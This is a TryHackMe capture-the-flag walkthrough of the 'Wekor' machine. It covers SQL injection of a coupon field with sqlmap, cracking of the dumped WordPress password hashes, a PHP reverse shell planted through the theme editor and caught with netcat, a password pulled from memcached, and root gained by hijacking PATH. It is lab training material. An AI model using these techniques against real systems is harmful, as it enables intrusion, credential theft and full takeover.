---
layout: default
title: Wekor
description: THM - Wekor
---

## Enumeration

First of all, we need to add "wekor.thm" to our "/etc/hosts"

Nmap Scan:
```
Nmap scan report for wekor.thm (10.10.174.31)
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Subdomain Enumeration:
```
000000382:   200        5 L      29 W       143 Ch      "site"
```
We've found a subdomain, "site.wekor.thm".
Let's keep it in mind for later.

Robots.txt:
```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```
Navigating to /comingreallysoon, we are greeted by this message:
```
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
```

Gobuster on /it-next:
```
/images
/css
/js
```
From what we can see, this is an e-commerce website. (more or less)

And a common vulnerability for this kind of website is an SQL injection.

We just need to find a field that makes sense.

When looking for this kind of vulnerability, think about it in terms of tables, veryfing information, and storage.

Items are stored, but we don't have any input field for the product id.

Next on our list, is the coupon code field on the cart page.

![cart](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_01.png)

Let's apply a "test" coupon, and send that request to sqlmap.
```
sqlmap -r cart_req.req --dump-all --batch --level 5 --risk 3 
```
Now, once you do that, the output will be MASSIVE.

I won't let you sort it on your own, the info we need is in the "wordpress" folder.

![wp_folder](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_02.png)

Open and inspect the "wp_users.csv" file.

![wp_users](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_03.png)

We found a list of users and password hashes.

Let's save the hashes and crack them using hashcat.
```
hashcat -m 400 hashwordpress /usr/share/wordlists/rockyou.txt --show
3 out of 4
```
We found 3 passwords. Let's attempt to login using them. 

BUT

Before we do that, we need to find a wordpress site. Remember that "site.wekor.thm" subdomain we found?

Let's add it to our "/etc/hosts", and enumerate it.

Gobuster on site.wekor.thm
```
/wordpress
/wordpress/wp-content
/wordpress/wp-includes
/wordpress/wp-admin
```
Now i'll try the 3 users we have credentials for, and most likely we'll have a theme editor shell in no time.

Aaand, we have dashboard access!

![dashboard](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/wekor_04.png)

## Exploitation

Let's get the theme editor running, and replace the 404.php content with a php shell.
```
# nc -lvnp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.174.31 46588
SOCKET: Shell has connected! PID: 2078
whoami
www-data
python3 -c 'import pty; pty.spawn("/bin/bash")'
<r.thm/wordpress/wp-content/themes/twentyseventeen$
```
By reading the passwd file, we identified another user, Orka.
```
Orka:x:1001:1001::/home/Orka:/bin/bash
```
Let's get linpeas and look for lateral privilege escalation.
```
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN
```
We see a service running on port 11211. A quick google search brings up Memcached caching system.

## Privilege Escalation

Another search into memcached brings up a telnet connection. So we can run telnet directly from the compromised server.
```
<r.thm/wordpress/wp-content/themes/twentyseventeen$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

stats items ## COMMAND 1 - We notice there's only one id. (id 1)

STAT items:1:number 5
STAT items:1:age 2999
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0

stats cachedump 1 0 ## COMMAND 2 - Display everything in id(1)
get user            ## COMMAND 3
get password        ## COMMAND 4
VALUE password 0 15
OrkAi[REDACTED]
```
Nice, we now have Orka's password. Let's try to switch users.
```
www-data@osboxes:/var/www$ su Orka
su Orka
Password: OrkA[REDACTED]
Orka@osboxes:/var/www$ 
Orka@osboxes:/var/www$ cd ~
cd ~
Orka@osboxes:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
Orka@osboxes:~$ cat user.txt
cat user.txt
1a26a6d51c0172400add0e297608dec6
Orka@osboxes:~$ 
```
Great! We now have the user flag.

Let's look for another privilege escalation vector. Try the usual: sudo -l; SUID binaries; PATH manipulation; etc.

I'll use linpeas again, just for commodity's sake.

Linpeas spitted this out:
```
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                     
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
This means we can write to "/usr/sbin"
```
Orka@osboxes:~$ sudo -l
sudo -l
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```
"sudo -l" returned "/home/Orka/Desktop/bitcoin"

Running "strings" on the bitcoin file:
```
t$,U
[^_]
Enter the password : 
password
Access Denied... 
Access Granted...
```
The password to run the file, is "password".

```
Orka@osboxes:~/Desktop$ which python
which python
/usr/bin/python
```

Our writable path, /usr/sbin/, has a higher precedence in this case than the python default of /usr/bin/.

We can use this to our advantage and escalate our privileges.
```
Orka@osboxes:~/Desktop$ cat > /usr/sbin/python << EOF
cat > /usr/sbin/python << EOF
> #!/bin/bash
#!/bin/bash
> /bin/bash
/bin/bash
> EOF
EOF
Orka@osboxes:~/Desktop$ chmod +x /usr/sbin/python
chmod +x /usr/sbin/python
Orka@osboxes:~/Desktop$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : password
password
Access Granted...
                        User Manual:
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 12
12
root@osboxes:~/Desktop# id
id
uid=0(root) gid=0(root) groups=0(root)
root@osboxes:~/Desktop# 
```
We now have root access to the machine. Read the flag and submit it!

Good hunting o7

[Try it out yourself!](https://tryhackme.com/room/wekorra)

[back](./)

